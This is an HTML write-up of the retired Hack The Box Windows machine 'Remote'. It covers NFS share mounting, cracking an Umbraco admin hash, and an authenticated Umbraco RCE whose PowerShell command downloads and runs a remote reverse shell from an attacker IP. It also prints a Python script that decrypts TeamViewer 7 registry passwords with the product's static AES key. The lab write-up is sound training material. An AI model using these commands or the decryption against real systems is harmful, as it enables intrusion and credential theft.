@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Remote &middot; Writeups</title>
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+</head>
+<body>
+<header class="topbar">
+  <a class="home" href="./index.html">&larr; all writeups</a>
+  <span class="brand">SAMSON &middot; CTF</span>
+</header>
+<main class="article">
+  <div class="boxhead">
+    <div class="bh-left">
+      <span class="badge htb">HTB</span>
+      <span class="badge os">Windows</span>
+      <span class="badge deep">in-depth</span>
+    </div>
+    <h1>Remote</h1>
+    <div class="meta">Target: <code>10.10.14.167</code></div>
+    <div class="tags"><span class="tag">Windows</span><span class="tag">NFS</span><span class="tag">Umbraco</span><span class="tag">CVE</span><span class="tag">RCE</span><span class="tag">credentialhunting</span><span class="tag">TeamViewer</span><span class="tag">AESDecryption</span><span class="tag">WinRM</span><span class="tag">PSExec</span></div>
+  </div>
+  <div class="layout">
+    <nav class="toc"><a class="lvl2" href="#overview">Overview</a><a class="lvl2" href="#recon">Recon</a><a class="lvl3" href="#nfs-share-enumeration">NFS Share Enumeration</a><a class="lvl2" href="#foothold">Foothold</a><a class="lvl3" href="#cracking-the-umbraco-admin-hash">Cracking the Umbraco Admin Hash</a><a class="lvl3" href="#umbraco-7-12-4-authenticated-rce">Umbraco 7.12.4 Authenticated RCE</a><a class="lvl2" href="#privilege-escalation">Privilege Escalation</a><a class="lvl3" href="#teamviewer-7-registry-keys-hardcoded-aes-key">TeamViewer 7 Registry Keys → Hardcoded AES Key</a><a class="lvl2" href="#root">Root</a><a class="lvl2" href="#takeaways">Takeaways</a></nav>
+    <article class="body"><h2 id="overview">Overview</h2>
+<p>Remote is an easy Windows box that demonstrates two distinct "credential in an unexpected place" findings. An NFS share exposed publicly lets anyone mount and browse a full site backup; inside is an Umbraco CMS database file containing a crackable SHA1 hash. Authenticating to Umbraco 7.12.4 and exploiting its authenticated RCE vulnerability grants a web shell. Root comes from TeamViewer 7 leftover registry keys that store the connection password AES-encrypted with a hardcoded key, decryptable in a short Python script.</p>
+<h2 id="recon">Recon</h2>
+<p>Nmap revealed an interesting combination: FTP (anonymous), HTTP, and NFS (RPC/mountd on 2049):</p>
+<pre><code class="language-sh">PORT     STATE SERVICE       VERSION
+21/tcp   open  ftp           Microsoft ftpd
+80/tcp   open  http          Microsoft HTTPAPI httpd 2.0
+111/tcp  open  rpcbind       2-4
+2049/tcp open  nfs
+445/tcp  open  microsoft-ds
+</code></pre>
+<p>Anonymous FTP showed no accessible files. GoBuster on port 80 found the Umbraco CMS installation:</p>
+<pre><code class="language-sh">/install   (Status: 302) --&gt; /umbraco/
+/umbraco   (Status: 200)
+/intranet  (Status: 200)
+</code></pre>
+<h3 id="nfs-share-enumeration">NFS Share Enumeration</h3>
+<pre><code class="language-sh">showmount -e 10.129.215.210
+Export list for 10.129.215.210:
+/site_backups (everyone)
+</code></pre>
+<blockquote>
+<p><strong>NFS shares exported to "everyone":</strong> NFS <code>(everyone)</code> means any host that can reach the port can mount the share with no authentication. This is a common misconfiguration on Windows when NFS is enabled for file sharing convenience; the administrator may not realize the exposure model differs from SMB.</p>
+</blockquote>
+<p>Mounting it locally:</p>
+<pre><code class="language-sh">sudo mount -t nfs 10.129.215.210:/site_backups ~/mount/
+ls ~/mount/
+App_Browsers  App_Data  App_Plugins  Config  Global.asax  Media
+Umbraco  Umbraco_Client  Views  Web.config  ...
+</code></pre>
+<h2 id="foothold">Foothold</h2>
+<h3 id="cracking-the-umbraco-admin-hash">Cracking the Umbraco Admin Hash</h3>
+<p>Under <code>App_Data</code>, an Umbraco <code>.sdf</code> (SQL Server Compact) database file contained credential strings readable via <code>strings</code>:</p>
+<pre><code>Administratoradmin‹redacted›{&quot;hashAlgorithm&quot;:&quot;SHA1&quot;}
+</code></pre>
+<p>Hash:</p>
+<pre><code>‹redacted›
+</code></pre>
+<pre><code class="language-sh">john hash --wordlist=/usr/share/wordlists/rockyou.txt
+‹redacted›     (?)
+</code></pre>
+<p>Credentials: <code>admin@htb.local:‹redacted›</code></p>
+<h3 id="umbraco-7-12-4-authenticated-rce">Umbraco 7.12.4 Authenticated RCE</h3>
+<p>The Umbraco Help section confirmed version <code>7.12.4</code>, which has a publicly documented authenticated RCE (EDB-46153 and improved version EDB-49488). The exploit allows arbitrary command execution through a crafted XSLT transformation request:</p>
+<pre><code class="language-sh">python umbraco.py \
+  -u admin@htb.local \
+  -p ‹redacted› \
+  -i http://10.129.215.210 \
+  -c &quot;powershell.exe&quot; \
+  -a &quot;/c iex(new-object net.webclient).downloadstring('http://10.10.14.167/shell.ps1');&quot;
+</code></pre>
+<p>The server fetched the Nishang shell and connected back:</p>
+<pre><code class="language-sh">rlwrap nc -lvnp 443
+Windows PowerShell running as user REMOTE$ on REMOTE
+PS C:\windows\system32\inetsrv&gt; whoami
+iis apppool\defaultapppool
+</code></pre>
+<p>User flag found in <code>C:\Users\Public\Desktop\</code>.</p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="teamviewer-7-registry-keys-hardcoded-aes-key">TeamViewer 7 Registry Keys → Hardcoded AES Key</h3>
+<p>Browsing <code>C:\Users\Public\Desktop</code> also showed a <code>TeamViewer 7.lnk</code> shortcut. TeamViewer was installed:</p>
+<pre><code class="language-powershell">cd &quot;\Program Files (x86)\TeamViewer&quot;
+</code></pre>
+<p>TeamViewer stores connection passwords in the registry, encrypted. The Metasploit module <code>post/windows/gather/credentials/teamviewer_passwords</code> targets these keys. Without MSF (OSCP prep), the same logic was replicated manually.</p>
+<p>Reading the Version7 registry key:</p>
+<pre><code class="language-powershell">cd HKLM:\software\wow6432node\teamviewer\version7
+get-itemproperty .
+# ...
+SecurityPasswordAES : {255, 155, 28, 115, 214, 107, 206, 49, 172, 65, 62, 174,
+                       19, 27, 70, 79, 88, 47, 108, 226, 209, 225, 243, 218,
+                       126, 141, 55, 107, 38, 57, 78, 91}
+</code></pre>
+<blockquote>
+<p><strong>TeamViewer's hardcoded AES key:</strong> TeamViewer 7 encrypts stored passwords with AES-128-CBC using a static key and IV that are the same across all installations. The Metasploit module includes these constants; by replicating the decryption in Python, the password is recovered without running Metasploit at all. This is a published research finding, the key was extracted from the TeamViewer binary.</p>
+</blockquote>
+<p>Python decryption:</p>
+<pre><code class="language-python">from Crypto.Cipher import AES
+
+key = b&quot;\x06\x02\x00\x00\x00\xa4\x00\x00\x52\x53\x41\x31\x00\x04\x00\x00&quot;
+iv  = b&quot;\x01\x00\x01\x00\x67\x24\x4F\x43\x6E\x67\x62\xF2\x5E\xA8\xD7\x04&quot;
+
+ciphertext = bytes([255, 155, 28, 115, 214, 107, 206, 49, 172, 65, 62, 174,
+                    19, 27, 70, 79, 88, 47, 108, 226, 209, 225, 243, 218,
+                    126, 141, 55, 107, 38, 57, 78, 91])
+
+aes = AES.new(key, AES.MODE_CBC, IV=iv)
+password = aes.decrypt(ciphertext).decode(&quot;utf-16&quot;).rstrip(&quot;\x00&quot;)
+print(f&quot;[+] Found password: {password}&quot;)
+# [+] Found password: ‹redacted›
+</code></pre>
+<p>Verified with NXC:</p>
+<pre><code class="language-sh">nxc smb 10.129.215.210 -u administrator -p '‹redacted›'
+SMB [+] remote\administrator:‹redacted› (Pwn3d!)
+</code></pre>
+<h2 id="root">Root</h2>
+<pre><code class="language-sh">evil-winrm -u administrator -p '‹redacted›' -i 10.129.215.210
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; whoami
+remote\administrator
+
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; type root.txt
+‹redacted›
+</code></pre>
+<h2 id="takeaways">Takeaways</h2>
+<ul>
+<li><strong>NFS exported to "everyone" is equivalent to an anonymous SMB share.</strong> Always run <code>showmount -e</code> against any host with RPC/NFS ports open.</li>
+<li><strong>Application backup directories expose the full source and database.</strong> An Umbraco <code>.sdf</code> file read via <code>strings</code> yields password hashes; combined with a known vulnerable version, that is full RCE.</li>
+<li><strong>Installed software leaves credential artifacts.</strong> TeamViewer, Filezilla, and similar tools store passwords in the registry or config files, often encrypted with keys that are public knowledge.</li>
+<li><strong>Replicating MSF module logic in Python avoids the tool restriction.</strong> Reading the Ruby source for the TeamViewer module revealed the exact AES key and IV needed to decrypt without running Metasploit.</li>
+</ul></article>
+  </div>
+</main>
+<footer class="foot">Samson Laird &middot; retired-machine writeups &middot; secrets redacted</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+</body>
+</html>
